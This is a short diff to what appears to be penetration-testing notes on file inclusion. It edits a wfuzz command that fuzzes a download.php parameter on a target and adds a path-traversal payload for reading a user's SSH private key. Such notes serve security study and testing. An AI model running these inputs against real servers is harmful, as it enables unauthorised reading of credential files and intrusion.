@@ -11,7 +11,13 @@ https://github.com/carlospolop/Auto_Wordlists/blob/main/custom_wordlists/file_in
 Check files
 
 ```
-wfuzz -c -w file_inclusion_linux.txt --hw 0 http://<target ip>/download.php?downloadurl=../../../../../../../FUZZ
+wfuzz -c -w file_inclusion_linux.txt --hw 0 http://<target ip>/download.php?downloadurl=FUZZ
+```
+
+Next, we can test reading the ssh key
+
+```
+../../../../../home/<username>/.ssh/id_rsa
 ```
 
 ### :open_file_folder: [Proc File System](https://www.netspi.com/blog/technical/web-application-penetration-testing/directory-traversal-file-inclusion-proc-file-system/)
